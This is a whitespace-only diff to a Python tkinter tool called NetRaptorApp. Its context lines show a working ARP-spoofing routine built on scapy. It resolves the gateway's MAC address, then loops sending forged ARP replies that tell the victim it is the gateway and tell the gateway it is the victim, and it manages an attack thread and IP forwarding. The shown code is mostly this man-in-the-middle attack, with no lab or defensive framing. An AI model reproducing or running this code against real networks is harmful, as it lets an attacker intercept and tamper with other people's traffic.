@@ -79,7 +79,7 @@ class NetRaptorApp:
         packet = broadcast / arp_request
         answered, _ = srp(packet, timeout=2, verbose=0)
         if answered:
-           return answered[0][1].hwsrc
+            return answered[0][1].hwsrc
         else:
              return None
 
@@ -158,7 +158,7 @@ class NetRaptorApp:
         disable_ip_forwarding()
 
         if self.attack_thread:
-           self.attack_thread.join()
+            self.attack_thread.join()
 
         target = self.selected_host.get()
         gateway = self.selected_gateway.get()
@@ -186,19 +186,19 @@ class NetRaptorApp:
         
         gateway_mac = get_mac(gateway_ip)
         if not gateway_mac:
-           messagebox.showerror("Error", f"Could not resolve MAC for gateway {gateway_ip}")
-           self.running = False
-           return
+            messagebox.showerror("Error", f"Could not resolve MAC for gateway {gateway_ip}")
+            self.running = False
+            return
 
         try:
             while self.running:
-                  # Poison victim: tell victim "I am gateway"
-                  send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
+                   # Poison victim: tell victim "I am gateway"
+                   send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
             
-                  # Poison gateway: tell gateway "I am victim"
-                  send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
+                   # Poison gateway: tell gateway "I am victim"
+                   send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
             
-                  time.sleep(1)
+                   time.sleep(1)
         except Exception as e:
                messagebox.showerror("Error", str(e))
 
@@ -215,6 +215,7 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = NetRaptorApp(root)
     root.mainloop()
+
 
 
 
